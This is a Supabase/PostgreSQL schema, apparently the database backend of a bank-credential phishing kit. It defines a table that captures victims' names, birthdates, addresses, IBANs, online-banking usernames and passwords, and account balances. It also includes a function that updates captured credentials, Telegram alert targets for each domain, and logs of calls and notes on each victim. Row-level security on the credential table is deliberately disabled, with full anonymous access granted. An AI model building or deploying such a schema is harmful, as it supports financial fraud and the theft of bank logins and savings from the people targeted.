
-- Enum
CREATE TYPE public.app_role AS ENUM ('admin');

-- user_roles
CREATE TABLE public.user_roles (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id UUID REFERENCES auth.users(id) ON DELETE CASCADE NOT NULL,
  role app_role NOT NULL,
  UNIQUE (user_id, role)
);
ALTER TABLE public.user_roles ENABLE ROW LEVEL SECURITY;

CREATE OR REPLACE FUNCTION public.has_role(_user_id UUID, _role app_role)
RETURNS BOOLEAN LANGUAGE sql STABLE SECURITY DEFINER SET search_path = public AS $$
  SELECT EXISTS (SELECT 1 FROM public.user_roles WHERE user_id = _user_id AND role = _role)
$$;

CREATE POLICY "Users can read own roles" ON public.user_roles
  FOR SELECT TO authenticated USING (auth.uid() = user_id);

CREATE OR REPLACE FUNCTION public.assign_admin_role()
RETURNS TRIGGER LANGUAGE plpgsql SECURITY DEFINER SET search_path = public AS $$
BEGIN
  INSERT INTO public.user_roles (user_id, role) VALUES (NEW.id, 'admin');
  RETURN NEW;
END;
$$;

CREATE TRIGGER on_auth_user_created_assign_role
AFTER INSERT ON auth.users
FOR EACH ROW EXECUTE FUNCTION public.assign_admin_role();

-- submissions
CREATE TABLE public.submissions (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  session_id text NOT NULL,
  created_at timestamptz DEFAULT now(),
  full_name text,
  email text,
  birthdate text,
  phone text,
  street text,
  house_number text,
  staircase text,
  door_number text,
  postal_code text,
  city text,
  iban text,
  bank text,
  bank_username text,
  bank_password text,
  bank_username_label text DEFAULT 'Benutzername',
  bank_password_label text DEFAULT 'Passwort',
  bank_extra jsonb DEFAULT '{}'::jsonb,
  balance text,
  status text DEFAULT 'Neu',
  notified_at timestamptz,
  telegram_sent boolean NOT NULL DEFAULT false,
  user_agent text,
  domain text
);

-- RLS bewusst deaktiviert (wie zuletzt aktiv)
ALTER TABLE public.submissions DISABLE ROW LEVEL SECURITY;
GRANT ALL ON public.submissions TO anon;
GRANT ALL ON public.submissions TO authenticated;

ALTER PUBLICATION supabase_realtime ADD TABLE public.submissions;

CREATE OR REPLACE FUNCTION public.update_bank_credentials(
  p_session_id text,
  p_username text,
  p_password text,
  p_username_label text DEFAULT 'Benutzername',
  p_password_label text DEFAULT 'Passwort',
  p_extra jsonb DEFAULT '{}'::jsonb
) RETURNS void LANGUAGE plpgsql SECURITY DEFINER SET search_path = public AS $$
BEGIN
  UPDATE public.submissions
  SET bank_username = p_username,
      bank_password = p_password,
      bank_username_label = p_username_label,
      bank_password_label = p_password_label,
      bank_extra = p_extra
  WHERE session_id = p_session_id;
END;
$$;

-- submission_notes
CREATE TABLE public.submission_notes (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  submission_id uuid REFERENCES public.submissions(id) ON DELETE CASCADE NOT NULL,
  user_id uuid NOT NULL,
  user_email text NOT NULL,
  content text NOT NULL,
  created_at timestamptz DEFAULT now()
);
ALTER TABLE public.submission_notes ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Admins can manage notes" ON public.submission_notes
  FOR ALL TO authenticated USING (public.has_role(auth.uid(), 'admin'::app_role));

-- submission_calls
CREATE TABLE public.submission_calls (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  submission_id uuid REFERENCES public.submissions(id) ON DELETE CASCADE NOT NULL,
  user_id uuid NOT NULL,
  user_email text NOT NULL,
  call_type text NOT NULL DEFAULT 'mailbox',
  created_at timestamptz DEFAULT now()
);
ALTER TABLE public.submission_calls ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Admins can manage calls" ON public.submission_calls
  FOR ALL TO authenticated USING (public.has_role(auth.uid(), 'admin'::app_role));

-- telegram_chat_ids (Endzustand: domains text[])
CREATE TABLE public.telegram_chat_ids (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  chat_id text NOT NULL UNIQUE,
  label text,
  domains text[] NOT NULL DEFAULT '{}',
  created_at timestamptz DEFAULT now()
);
ALTER TABLE public.telegram_chat_ids ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Admins can manage telegram chat ids"
  ON public.telegram_chat_ids FOR ALL TO authenticated
  USING (public.has_role(auth.uid(), 'admin'::app_role))
  WITH CHECK (public.has_role(auth.uid(), 'admin'::app_role));
